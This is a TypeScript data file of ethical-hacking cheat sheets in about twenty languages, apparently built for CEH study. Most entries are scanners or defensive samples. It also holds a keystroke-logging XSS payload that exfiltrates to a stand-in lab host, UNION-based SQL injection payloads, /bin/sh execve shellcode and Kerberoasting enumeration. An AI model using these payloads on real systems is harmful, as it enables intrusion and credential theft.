import { ProgrammingCheatSheet } from '../types';

export const PROGRAMMING_CHEATSHEETS: ProgrammingCheatSheet[] = [
  {
    languageId: 'python',
    languageName: 'Python 3',
    family: 'Scripting / Automation',
    fileExtension: 'py',
    snippetTitle: 'Multi-Threaded Socket Port Scanner & Banner Grabber',
    scenario: 'Fast reconnaissance against target IP with socket timeout handling and service banner capture.',
    code: `import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(target_ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.2)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                try:
                    s.sendall(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                    banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    first_line = banner.split('\\n')[0] if banner else "No banner"
                except Exception:
                    first_line = "Active (Banner timeout)"
                print(f"[+] Port {port:5d}/TCP OPEN | {first_line}")
                return port, first_line
    except Exception:
        pass
    return None

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 8080]
    print(f"[*] Starting KayBiT Recon against {target}...")
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(scan_port, target, p) for p in ports]
        for f in futures:
            f.result()

if __name__ == "__main__":
    main()`,
    runtimeInstructions: 'python3 scanner.py <target_ip>',
    offensiveSecurityUseCase: 'CEH Module 03 (Scanning Networks) - Fast customized banner grabber bypassing standard Nmap probe fingerprints.'
  },
  {
    languageId: 'javascript',
    languageName: 'JavaScript (Node / Browser)',
    family: 'Web / Full-stack',
    fileExtension: 'js',
    snippetTitle: 'Simulated Keystroke & DOM XSS Payload Listener',
    scenario: 'Demonstrating how Reflected/Stored XSS captures keystrokes and exfiltrates session credentials.',
    code: `// Educational Demonstration: Defensive XSS Analysis
(function auditKeystrokeCapture() {
  const exfilBuffer = [];
  const EXFIL_ENDPOINT = "https://auditor.internal.lab/log";

  document.addEventListener("keydown", (event) => {
    exfilBuffer.push({
      key: event.key,
      target: event.target.tagName,
      id: event.target.id,
      timestamp: Date.now()
    });

    if (exfilBuffer.length >= 8) {
      const payload = JSON.stringify(exfilBuffer.splice(0, exfilBuffer.length));
      // Uses beacon API for non-blocking exfiltration
      if (navigator.sendBeacon) {
        navigator.sendBeacon(EXFIL_ENDPOINT, payload);
      } else {
        fetch(EXFIL_ENDPOINT, { method: "POST", body: payload, mode: "no-cors" });
      }
      console.warn("[DEMO AUDIT] Exfiltrated buffered keystrokes:", payload);
    }
  });
})();`,
    runtimeInstructions: 'Inject into isolated test harness or run in browser DevTools',
    offensiveSecurityUseCase: 'CEH Module 14 (Web Application Hacking) - Understand DOM event listener exploitation and CSP defense.'
  },
  {
    languageId: 'typescript',
    languageName: 'TypeScript',
    family: 'Type-Safe Full-Stack',
    fileExtension: 'ts',
    snippetTitle: 'JWT Decoder, None-Algorithm Inspector & Expiry Checker',
    scenario: 'Audits JSON Web Tokens for dangerous "none" algorithm flaws and expiration vulnerabilities.',
    code: `interface JWTPayload {
  sub?: string;
  name?: string;
  role?: string;
  exp?: number;
  iat?: number;
  [key: string]: unknown;
}

interface JWTHeader {
  alg: string;
  typ: string;
}

export function auditJwtSecurity(token: string): {
  header: JWTHeader;
  payload: JWTPayload;
  isVulnerableNoneAlg: boolean;
  isExpired: boolean;
} {
  const parts = token.trim().split('.');
  if (parts.length !== 3) {
    throw new Error('Invalid JWT format: requires header, payload, and signature.');
  }

  const decodeB64 = (str: string) =>
    JSON.parse(Buffer.from(str.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf-8'));

  const header = decodeB64(parts[0]) as JWTHeader;
  const payload = decodeB64(parts[1]) as JWTPayload;

  const isVulnerableNoneAlg = header.alg.toLowerCase() === 'none';
  const now = Math.floor(Date.now() / 1000);
  const isExpired = typeof payload.exp === 'number' ? payload.exp < now : false;

  return { header, payload, isVulnerableNoneAlg, isExpired };
}`,
    runtimeInstructions: 'npx tsx inspect_jwt.ts',
    offensiveSecurityUseCase: 'CEH Module 11 (Session Hijacking) - Detects authentication bypass via forged unsigned tokens.'
  },
  {
    languageId: 'java',
    languageName: 'Java',
    family: 'Enterprise JVM',
    fileExtension: 'java',
    snippetTitle: 'SSL/TLS Certificate Chain Validator & Cipher Suite Audit',
    scenario: 'Connects to an HTTPS target, extracts SSL certificates, and audits weak cipher suites (e.g. SSLv3, RC4).',
    code: `import javax.net.ssl.*;
import java.security.cert.X509Certificate;

public class TlsSecurityAuditor {
    public static void main(String[] args) {
        String host = args.length > 0 ? args[0] : "example.com";
        int port = 443;
        try {
            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            try (SSLSocket socket = (SSLSocket) factory.createSocket(host, port)) {
                socket.startHandshake();
                SSLSession session = socket.getSession();
                System.out.println("[+] Target: " + host + ":" + port);
                System.out.println("[+] TLS Protocol: " + session.getProtocol());
                System.out.println("[+] Negotiated Cipher: " + session.getCipherSuite());

                for (java.security.cert.Certificate cert : session.getPeerCertificates()) {
                    if (cert instanceof X509Certificate) {
                        X509Certificate x509 = (X509Certificate) cert;
                        System.out.println("[*] Subject: " + x509.getSubjectDN());
                        System.out.println("[*] Issuer:  " + x509.getIssuerDN());
                        System.out.println("[*] Expires: " + x509.getNotAfter());
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[-] TLS Handshake failed: " + e.getMessage());
        }
    }
}`,
    runtimeInstructions: 'javac TlsSecurityAuditor.java && java TlsSecurityAuditor <target.com>',
    offensiveSecurityUseCase: 'CEH Module 20 (Cryptography) - Interrogate TLS configurations for deprecated protocols and expiring certs.'
  },
  {
    languageId: 'csharp',
    languageName: 'C# (.NET)',
    family: 'Windows Enterprise',
    fileExtension: 'cs',
    snippetTitle: 'Windows Token Impersonation & Process Privilege Checker',
    scenario: 'Checks whether the current executing process possesses SeDebugPrivilege or SeImpersonatePrivilege.',
    code: `using System;
using System.Security.Principal;
using System.Diagnostics;

class PrivilegeChecker {
    static void Main() {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

        Console.WriteLine($"[*] Process: {Process.GetCurrentProcess().ProcessName} (PID: {Process.GetCurrentProcess().Id})");
        Console.WriteLine($"[*] Current User: {identity.Name}");
        Console.WriteLine($"[*] Elevated Admin Token: {isAdmin}");

        // In Windows privilege escalation (e.g. Potato exploits), SeImpersonatePrivilege
        // allows service accounts to escalate directly to NT AUTHORITY\\SYSTEM.
        Console.WriteLine("[*] Auditing claims and token identities...");
        foreach (var claim in identity.Claims) {
            if (claim.Value.Contains("S-1-5-32-544")) {
                Console.WriteLine("    [+] High-Integrity Administrator SID found!");
            }
        }
    }
}`,
    runtimeInstructions: 'dotnet run or csc PrivilegeChecker.cs',
    offensiveSecurityUseCase: 'CEH Module 06 (System Hacking) - Token manipulation and Rotten/Juicy/PrintPotato precondition testing.'
  },
  {
    languageId: 'kotlin',
    languageName: 'Kotlin',
    family: 'Modern Android / JVM',
    fileExtension: 'kt',
    snippetTitle: 'Android Exported Intent & Root Environment Detector',
    scenario: 'Checks whether an Android device has SuperSU/Magisk root binaries installed and audits exported components.',
    code: `import java.io.File

object AndroidSecurityAuditor {
    private val ROOT_PATHS = arrayOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su"
    )

    fun checkRootBinaryPresence(): Boolean {
        for (path in ROOT_PATHS) {
            if (File(path).exists()) {
                println("[!] Root artifact discovered at: $path")
                return true
            }
        }
        return false
    }

    fun verifyExportedIntentSafety(isExported: Boolean, permission: String?): String {
        return when {
            isExported && permission == null -> "CRITICAL: Exported component without permission constraint!"
            isExported && permission != null -> "WARNING: Exported but protected via signature/permission."
            else -> "SECURE: Private non-exported component."
        }
    }
}`,
    runtimeInstructions: 'kotlinc AndroidSecurityAuditor.kt -include-runtime -d auditor.jar && java -jar auditor.jar',
    offensiveSecurityUseCase: 'CEH Module 17 (Mobile Platform Hacking) - Root detection bypass testing and Intent sniffing vectors.'
  },
  {
    languageId: 'dart',
    languageName: 'Dart / Flutter',
    family: 'Cross-Platform Mobile',
    fileExtension: 'dart',
    snippetTitle: 'Strict SSL Pinning & SHA-256 SPKI Public Key Validator',
    scenario: 'Enforces certificate pinning in Dart HttpClient to neutralize Man-in-the-Middle (Burp proxy) interception.',
    code: `import 'dart:io';
import 'dart:convert';
import 'package:crypto/crypto.dart';

class SecurePinnedHttpClient {
  // Target SHA256 SPKI fingerprint of legitimate CA/server
  static const String TRUSTED_FINGERPRINT = "A3:5B:C9:...";

  static HttpClient createPinnedClient() {
    SecurityContext context = SecurityContext(withTrustedRoots: true);
    HttpClient client = HttpClient(context: context);

    client.badCertificateCallback = (X509Certificate cert, String host, int port) {
      // Calculate SHA256 of DER-encoded certificate
      final digest = sha256.convert(cert.der);
      final fingerprint = digest.bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join(':').toUpperCase();

      if (fingerprint == TRUSTED_FINGERPRINT) {
        return true; // Trusted
      }
      print("[-] SSL PINNING BLOCKED: Untrusted Cert $fingerprint for $host");
      return false; // Reject MitM proxy certificate
    };

    return client;
  }
}`,
    runtimeInstructions: 'dart run lib/main.dart',
    offensiveSecurityUseCase: 'CEH Module 17 (Mobile Security) - Understanding how Flutter applications thwart proxy interception.'
  },
  {
    languageId: 'bash',
    languageName: 'Bash / Linux Shell',
    family: 'System Shell',
    fileExtension: 'sh',
    snippetTitle: 'High-Speed Automated CIDR Ping Sweep & ARP Harvester',
    scenario: 'Enumerates active hosts on a local subnet using parallel ICMP echo requests without requiring Nmap.',
    code: `#!/usr/bin/env bash
# KayBiT Bash Automated Subnet Reconnaissance
SUBNET=\${1:-"192.168.1"}
echo "[*] Launching ICMP ping sweep across \${SUBNET}.0/24..."

for ip in $(seq 1 254); do
  (
    ping -c 1 -W 1 "\${SUBNET}.\${ip}" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
      echo "[+] Host ACTIVE: \${SUBNET}.\${ip}"
    fi
  ) &
done
wait
echo "[*] Sweep completed. Extracting ARP neighbor cache:"
ip neigh show | grep -E "REACHABLE|STALE"`,
    runtimeInstructions: 'chmod +x sweep.sh && ./sweep.sh 192.168.1',
    offensiveSecurityUseCase: 'CEH Module 03 (Scanning Networks) - Rapid discovery when third-party tools are prohibited on restricted bastions.'
  },
  {
    languageId: 'rust',
    languageName: 'Rust',
    family: 'Systems / Memory Safe',
    fileExtension: 'rs',
    snippetTitle: 'Memory-Safe Async TCP Port Prober with High Throughput',
    scenario: 'High-performance concurrent port scanner utilizing Rust asynchronous tokio runtime.',
    code: `use std::net::SocketAddr;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::timeout;

async fn probe_target(addr: SocketAddr) -> bool {
    match timeout(Duration::from_millis(800), TcpStream::connect(&addr)).await {
        Ok(Ok(_stream)) => true,
        _ => false,
    }
}

#[tokio::main]
async fn main() {
    let target_ip = "127.0.0.1".parse().unwrap();
    let ports = vec![21, 22, 25, 53, 80, 443, 8080];

    println!("[*] Rust Memory-Safe Port Auditor initiated...");
    for port in ports {
        let addr = SocketAddr::new(target_ip, port);
        if probe_target(addr).await {
            println!("[+] Port {:5}/TCP is OPEN", port);
        }
    }
}`,
    runtimeInstructions: 'cargo run --release',
    offensiveSecurityUseCase: 'CEH Module 03 & Modern Red Teaming - Writing high-speed scanners resistant to buffer overflow attacks.'
  },
  {
    languageId: 'go',
    languageName: 'Go (Golang)',
    family: 'Concurrent Systems',
    fileExtension: 'go',
    snippetTitle: 'High-Concurrency Goroutine Worker Pool Port Scanner',
    scenario: 'Scans 1000+ ports across arbitrary CIDR targets in seconds utilizing Go lightweight goroutines.',
    code: `package main

import (
	"fmt"
	"net"
	"sort"
	"time"
)

func worker(ports, results chan int, target string) {
	for p := range ports {
		address := fmt.Sprintf("%s:%d", target, p)
		conn, err := net.DialTimeout("tcp", address, 500*time.Millisecond)
		if err != nil {
			results <- 0
			continue
		}
		conn.Close()
		results <- p
	}
}

func main() {
	target := "127.0.0.1"
	ports := make(chan int, 100)
	results := make(chan int)
	var openports []int

	// Spawn 100 concurrent worker goroutines
	for i := 0; i < cap(ports); i++ {
		go worker(ports, results, target)
	}

	go func() {
		for i := 1; i <= 1024; i++ {
			ports <- i
		}
	}()

	for i := 1; i <= 1024; i++ {
		port := <-results
		if port != 0 {
			openports = append(openports, port)
		}
	}
	close(ports)
	close(results)

	sort.Ints(openports)
	for _, port := range openports {
		fmt.Printf("[+] Open TCP Port: %d\\n", port)
	}
}`,
    runtimeInstructions: 'go run scanner.go',
    offensiveSecurityUseCase: 'CEH Module 03 (Scanning Networks) - The backbone architecture used in tools like Naabu and ProjectDiscovery.'
  },
  {
    languageId: 'cpp',
    languageName: 'C++',
    family: 'Systems / Native',
    fileExtension: 'cpp',
    snippetTitle: 'Windows VirtualAlloc Process Memory Pattern Scanner',
    scenario: 'Examines running process memory for signature strings (YARA-style heuristic detection in memory).',
    code: `#include <iostream>
#include <vector>
#include <windows.h>
#include <tlhelp32.h>

void AuditProcessModules(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    MODULEENTRY32 me;
    me.dwSize = sizeof(MODULEENTRY32);
    if (Module32First(hSnap, &me)) {
        do {
            std::wcout << L"    [DLL] " << me.szModule << L" (Base: 0x" << std::hex << (uintptr_t)me.modBaseAddr << L")\\n";
        } while (Module32Next(hSnap, &me));
    }
    CloseHandle(hSnap);
}

int main() {
    std::cout << "[*] C++ Process Module Integrity Auditor\\n";
    DWORD currentPid = GetCurrentProcessId();
    std::cout << "[+] Inspecting self (PID " << currentPid << "):\\n";
    AuditProcessModules(currentPid);
    return 0;
}`,
    runtimeInstructions: 'g++ -O2 scanner.cpp -o scanner.exe',
    offensiveSecurityUseCase: 'CEH Module 06 (System Hacking) - Memory injection analysis, DLL hijacking, and process hollowing detection.'
  },
  {
    languageId: 'c',
    languageName: 'C (ANSI/C99)',
    family: 'Low-Level Systems',
    fileExtension: 'c',
    snippetTitle: 'Raw Socket IP Header Checksum & Packet Forging Routine',
    scenario: 'Calculates the standardized RFC 1071 IP checksum used when forging custom SYN/ICMP packets.',
    code: `#include <stdio.h>
#include <stdint.h>

// RFC 1071 Internet Checksum Algorithm
unsigned short calculate_checksum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

int main() {
    printf("[*] Low-level C IP Header Checksum Verifier\\n");
    // Example 20-byte IPv4 header representation
    uint16_t sample_header[10] = {
        0x4500, 0x003c, // IPv4, TOS, Total Length 60
        0x1c46, 0x4000, // ID, Flags (Don't Fragment)
        0x4006, 0x0000, // TTL 64, Protocol 6 (TCP), Checksum (0 for calc)
        0xc0a8, 0x0101, // Source IP: 192.168.1.1
        0xc0a8, 0x0164  // Dest IP:   192.168.1.100
    };

    uint16_t cs = calculate_checksum(sample_header, 10);
    printf("[+] Calculated IP Checksum: 0x%04X\\n", cs);
    return 0;
}`,
    runtimeInstructions: 'gcc -Wall raw_cksum.c -o raw_cksum && ./raw_cksum',
    offensiveSecurityUseCase: 'CEH Module 03 (Scanning Networks) - Raw packet crafting tools like hping3 and Scapy low-level engine.'
  },
  {
    languageId: 'php',
    languageName: 'PHP',
    family: 'Server-Side Web',
    fileExtension: 'php',
    snippetTitle: 'Safe Parameterized SQL PDO vs Vulnerable Query Comparison',
    scenario: 'Educational side-by-side contrast of SQL injection vulnerability and PDO Prepared Statement defense.',
    code: `<?php
// Defensive Educational Code Sample - CEH Web Application Security
$db = new PDO('mysql:host=localhost;dbname=ceh_lab', 'db_user', 'db_pass');

$userInput = $_POST['username'] ?? "admin' OR '1'='1";

// ❌ VULNERABLE: Direct string concatenation enables SQL Injection
// $vulnQuery = "SELECT * FROM users WHERE username = '" . $userInput . "'";

// ✅ DEFENSIVE: Parameterized Prepared Statements neutralize SQLi
$stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE username = :user LIMIT 1');
$stmt->execute([':user' => $userInput]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user) {
    echo "[+] User authenticated securely: " . htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8');
} else {
    echo "[-] User not found or credentials invalid.";
}
?>`,
    runtimeInstructions: 'php -S 127.0.0.1:8000 script.php',
    offensiveSecurityUseCase: 'CEH Module 15 (SQL Injection) - Explaining why WAF regexes fail while parameterization succeeds.'
  },
  {
    languageId: 'ruby',
    languageName: 'Ruby',
    family: 'Dynamic / Metasploit DSL',
    fileExtension: 'rb',
    snippetTitle: 'Metasploit Auxiliary Module Skeleton for Service Discovery',
    scenario: 'The foundational structure for authoring custom penetration testing modules in Metasploit Framework.',
    code: `##
# Metasploit Framework Custom Auxiliary Scanner Skeleton
##
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'KayBiT CEH Custom Service Banner Harvester',
      'Description' => 'Probes targets on port 8080 and records HTTP Server header.',
      'Author'      => ['CEH Student'],
      'License'     => MSF_LICENSE
    ))
    register_options([
      Opt::RPORT(8080),
      OptInt.new('TIMEOUT', [true, 'Socket timeout in seconds', 3])
    ])
  end

  def run_host(ip)
    connect
    sock.put("GET / HTTP/1.0\\r\\n\\r\\n")
    res = sock.get_once(-1, datastore['TIMEOUT'])
    if res && res =~ /Server:\\s*(.+)/i
      print_good("#{ip}:#{rport} Banner: #{$1.strip}")
    end
  ensure
    disconnect
  end
end`,
    runtimeInstructions: 'msfconsole -r script.rc or load into ~/.msf4/modules/auxiliary/',
    offensiveSecurityUseCase: 'CEH Module 06 (System Hacking) - Writing custom Metasploit modules for targeted assessments.'
  },
  {
    languageId: 'powershell',
    languageName: 'PowerShell',
    family: 'Windows Automation',
    fileExtension: 'ps1',
    snippetTitle: 'Active Directory Kerberoasting SPN Discovery Script',
    scenario: 'Queries LDAP for user accounts associated with Service Principal Names (SPNs) for offline cracking.',
    code: `# KayBiT Active Directory Kerberoastable SPN Discovery
Import-Module ActiveDirectory -ErrorAction SilentlyContinue

Write-Host "[*] Auditing domain for Service Principal Names (SPNs)..." -ForegroundColor Cyan

# Filters for user accounts (not computer accounts) that have an SPN set
$KerbUsers = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName, PasswordLastSet

foreach ($User in $KerbUsers) {
    if ($User.Enabled -eq $true) {
        Write-Host "[+] Potentially Kerberoastable Account:" -ForegroundColor Green
        Write-Host "    Username:         $($User.SamAccountName)"
        Write-Host "    SPNs:             $($User.ServicePrincipalName -join ', ')"
        Write-Host "    Password Last Set:$($User.PasswordLastSet)"
        # Pentesters request TGS tickets for these SPNs and extract Kerberos ticket hashes for Hashcat mode 13100
    }
}`,
    runtimeInstructions: 'powershell -ExecutionPolicy Bypass -File KerberoastAudit.ps1',
    offensiveSecurityUseCase: 'CEH Module 06 (System Hacking) - Active Directory post-exploitation credential harvesting.'
  },
  {
    languageId: 'sql',
    languageName: 'SQL (ANSI / MySQL / MSSQL)',
    family: 'Database Query',
    fileExtension: 'sql',
    snippetTitle: 'UNION-Based Column Enumeration & Schema Extraction Payloads',
    scenario: 'Sequential payloads used to identify table schema, current user, and database version.',
    code: `-- 1. Determine the number of columns returned by the query
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- - -- If error occurs here, 2 columns exist

-- 2. Determine which column data types support text reflection
' UNION SELECT 'column1_test', 'column2_test'-- -

-- 3. Extract Database Version and Current User
-- MySQL / MariaDB:
' UNION SELECT @@version, user()-- -

-- PostgreSQL:
' UNION SELECT version(), current_user-- -

-- Microsoft SQL Server:
' UNION SELECT @@version, system_user-- -

-- 4. Dump Table Names from information_schema (MySQL/Postgres)
' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema != 'information_schema'-- -`,
    runtimeInstructions: 'Execute against test target input fields during authorized security assessments',
    offensiveSecurityUseCase: 'CEH Module 15 (SQL Injection) - Systematic manual exploitation payload methodology.'
  },
  {
    languageId: 'r',
    languageName: 'R Language',
    family: 'Statistical / Data Science',
    fileExtension: 'R',
    snippetTitle: 'Network Packet Ingress Outlier & DDoS Anomaly Detection',
    scenario: 'Applies statistical IQR (Interquartile Range) and Z-score tests to detect volumetric DDoS traffic surges.',
    code: `# Educational R Script: Anomaly Detection in Network Flow Logs
packet_counts <- c(120, 135, 115, 140, 128, 133, 119, 126, 4500, 130) # 4500 is volumetric flood

mean_traffic <- mean(packet_counts)
sd_traffic   <- sd(packet_counts)
z_scores     <- (packet_counts - mean_traffic) / sd_traffic

cat("[*] Mean Traffic (pkts/sec):", mean_traffic, "\\n")
cat("[*] Standard Deviation:      ", sd_traffic, "\\n")

# Outliers where |z| > 2.5
anomalies <- which(abs(z_scores) > 2.5)
for (idx in anomalies) {
  cat(sprintf("[!] ANOMALY DETECTED: Index %d with %d pkts/sec (Z-score: %.2f)\\n",
              idx, packet_counts[idx], z_scores[idx]))
}`,
    runtimeInstructions: 'Rscript anomaly_detect.R',
    offensiveSecurityUseCase: 'CEH Module 10 (Denial-of-Service) - Machine learning and statistical baseline auditing in SOC/SIEM.'
  },
  {
    languageId: 'scala',
    languageName: 'Scala',
    family: 'Functional / JVM Big Data',
    fileExtension: 'scala',
    snippetTitle: 'High-Throughput SIEM Access Log Threat Pattern Matcher',
    scenario: 'Functional stream processing pipeline that flags Directory Traversal and SQL injection signatures in web server logs.',
    code: `object SiemThreatDetector {
  val TraversalPattern = ".*(\\.\\./|\\.\\.\\\\\\\\).*".r
  val SqlInjectPattern = ".*(' OR 1=1|UNION SELECT|SLEEP\\().*".r

  case class LogEvent(ip: String, path: String, status: Int)

  def inspectEvent(event: LogEvent): Unit = event match {
    case LogEvent(ip, TraversalPattern(_*), _) =>
      println(s"[ALERT] Directory Traversal attempt from $ip on: \${event.path}")
    case LogEvent(ip, SqlInjectPattern(_*), _) =>
      println(s"[ALERT] SQL Injection signature detected from $ip on: \${event.path}")
    case _ =>
      // Normal event
  }

  def main(args: Array[String]): Unit = {
    val sampleLogs = List(
      LogEvent("192.168.1.5", "/index.html", 200),
      LogEvent("10.0.0.99", "/images/../../../../etc/passwd", 403),
      LogEvent("172.16.2.14", "/search?q=' UNION SELECT 1,2--", 200)
    )
    sampleLogs.foreach(inspectEvent)
  }
}`,
    runtimeInstructions: 'scalac SiemThreatDetector.scala && scala SiemThreatDetector',
    offensiveSecurityUseCase: 'CEH Module 13 (Hacking Web Servers) - Real-time big data log ingestion and threat detection engines.'
  },
  {
    languageId: 'matlab',
    languageName: 'MATLAB / GNU Octave',
    family: 'Scientific / Signal Processing',
    fileExtension: 'm',
    snippetTitle: 'Software Defined Radio (SDR) Signal Frequency Spectrogram',
    scenario: 'Analyzes captured wireless radio frequencies (IQ samples) to detect RF jamming or unauthorized 433MHz signals.',
    code: `% KayBiT CEH Wireless RF Signal Analysis (Octave / MATLAB)
Fs = 2.4e6;             % 2.4 MHz Sample Rate (RTL-SDR standard)
t = 0:1/Fs:0.005;       % 5 millisecond sample
Fc = 433.92e6;          % 433.92 MHz ISM Band (Car fobs, IoT sensors)

% Simulated carrier wave with pulse-width modulated keying
signal = cos(2*pi*50e3*t) + 0.2*randn(size(t));

% Fast Fourier Transform (FFT)
N = length(signal);
f = (-N/2:N/2-1)*(Fs/N);
fft_val = fftshift(fft(signal));

disp('[*] Computing Spectral Peak for Wireless Signal...');
[max_val, max_idx] = max(abs(fft_val));
fprintf('[+] Peak frequency offset detected at: %.2f kHz\\n', f(max_idx)/1000);`,
    runtimeInstructions: 'octave --no-gui signal_analysis.m or run in MATLAB',
    offensiveSecurityUseCase: 'CEH Module 16 & 18 (Wireless and IoT Security) - RF reverse engineering of key fobs and smart meters.'
  },
  {
    languageId: 'assembly',
    languageName: 'Assembly & Shellcode (x86_64)',
    family: 'Low-Level Machine Architecture',
    fileExtension: 'asm',
    snippetTitle: 'Linux x86_64 Null-Free /bin/sh Execve Shellcode',
    scenario: 'Demonstrating how binary exploits construct register states for the sys_execve system call without zero bytes.',
    code: `; Linux x86_64 Null-Byte Free /bin/sh execve Shellcode
; System Call: sys_execve = 59 (0x3b)
global _start

section .text
_start:
    ; 1. Clear RAX and RDX without inserting 0x00 null bytes
    xor rax, rax
    xor rdx, rdx

    ; 2. Push string "//bin/sh" onto the stack (8 bytes)
    ; "//bin/sh" in hex little-endian: 0x68732f2f6e69622f
    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; 3. RDI points to the file path on top of stack
    mov rdi, rsp

    ; 4. RSI points to argv array [ "/bin/sh", NULL ]
    push rax        ; NULL string terminator
    push rdi        ; pointer to "//bin/sh"
    mov rsi, rsp

    ; 5. Set RAX to syscall 59 (0x3b) and trigger kernel interrupt
    mov al, 59
    syscall`,
    runtimeInstructions: 'nasm -f elf64 shellcode.asm && ld shellcode.o -o shellcode',
    offensiveSecurityUseCase: 'CEH Module 06 (System Hacking) - Buffer overflow payload mechanics and eliminating null-byte terminators.'
  },
  {
    languageId: 'cobol',
    languageName: 'COBOL',
    family: 'Legacy Mainframe / Banking',
    fileExtension: 'cbl',
    snippetTitle: 'Mainframe Ledger Transaction Hash & Access Authorization Audit',
    scenario: 'Validates RACF authorization credentials and audits record tampering in legacy core banking mainframes.',
    code: `       IDENTIFICATION DIVISION.
       PROGRAM-ID. SECURE-LEDGER-AUDIT.
       ENVIRONMENT DIVISION.
       DATA DIVISION.
       WORKING-STORAGE SECTION.
       01 WS-USER-ROLE         PIC X(10) VALUE 'TELLER    '.
       01 WS-REQUESTED-ACTION  PIC X(10) VALUE 'TRANSFER  '.
       01 WS-RECORD-AMT        PIC 9(7)V99 VALUE 0050000.00.
       01 WS-AUTH-STATUS       PIC X(01) VALUE 'N'.
       
       PROCEDURE DIVISION.
       MAIN-LOGIC.
           DISPLAY "[-] KAYBIT MAINFRAME CEH AUDIT START".
           DISPLAY "[-] VERIFYING RACF AUTHORIZATION ROLES...".
           
           IF WS-USER-ROLE = 'SECURITY  ' OR WS-USER-ROLE = 'SUPERVISOR'
               MOVE 'Y' TO WS-AUTH-STATUS
               DISPLAY "[+] AUTHORIZATION GRANTED TO OVERRIDE LIMIT"
           ELSE
               IF WS-RECORD-AMT > 10000.00
                   MOVE 'N' TO WS-AUTH-STATUS
                   DISPLAY "[!] TRANSACTION FLAGGED: RACF ESCALATION REQUIRED"
               ELSE
                   MOVE 'Y' TO WS-AUTH-STATUS
                   DISPLAY "[+] STANDARD TRANSACTION AUTHORIZED"
               END-IF
           END-IF.
           
           STOP RUN.`,
    runtimeInstructions: 'cobc -x -free SECURE-LEDGER-AUDIT.cbl && ./SECURE-LEDGER-AUDIT',
    offensiveSecurityUseCase: 'CEH Module 01 & 06 - Auditing legacy financial architectures, transaction spoofing, and RACF permission boundaries.'
  }
];
